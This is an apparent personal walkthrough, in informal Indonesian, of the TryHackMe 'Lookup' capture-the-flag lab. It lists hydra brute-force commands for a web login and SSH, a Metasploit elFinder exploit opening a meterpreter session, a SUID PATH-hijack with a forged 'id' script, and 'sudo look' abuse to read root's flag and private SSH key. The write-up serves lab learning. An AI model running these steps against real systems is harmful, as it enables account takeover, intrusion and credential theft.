1. scan nmap -> 80 kebuka -> masukin etc hosts
2. brute pake seclist username names -> ketemu jose -> coba brute username di burp aja soalnya response salah username nya keliatan
3. hydra -l jose -P rockyou.txt lookup.thm http-form-post "/login.php:username=^USER^&password=^PASS^:TergantungResponse isi Wrong aj" -V -f
4. ketemu password123
5. ketemu subdomain files.lookup.thm -> elfinder -> search di msfconsole -> ambil yg php conector 
6. show options -> rhost subdomain -> lhost ip vpn -> run
7. masuk meterpreter -> shell -> pindah ke /tmp -> run find / -perm -u=s -type f 2>/dev/null -> ada pwm usr/sbin
8. pindahin aja -> export PATH=/tmp:$PATH -> echo $PATH -> run pwm di /tmp
9. bikin file id -> echo '#!/bin/bash' > id -> lanjut isinya id gini
10. echo 'echo "uid=1000(think) gid=1000(think) groups=1000(think)"' >> id -> think di dapet dari /home
11. chmod +x id -> run pwm -> mungkin itu wordlist password ssh think
12. hydra -l think -P wordlistnya.txt ip shh -V -f -> login ssh
13. sudo -l -> ada look -> cek gtfo 
14. bisa liat file root -> sudo look '' "/root/root.txt" misal -> atau id rsa aja terus login nanti pake root@ip
15. sudo look '' ".ssh/id_rsa" -> kalau root -> sudo look '' "/root/.ssh/id_rsa" copas -> chmod 600 id_rsa -> ssh -i kesitu
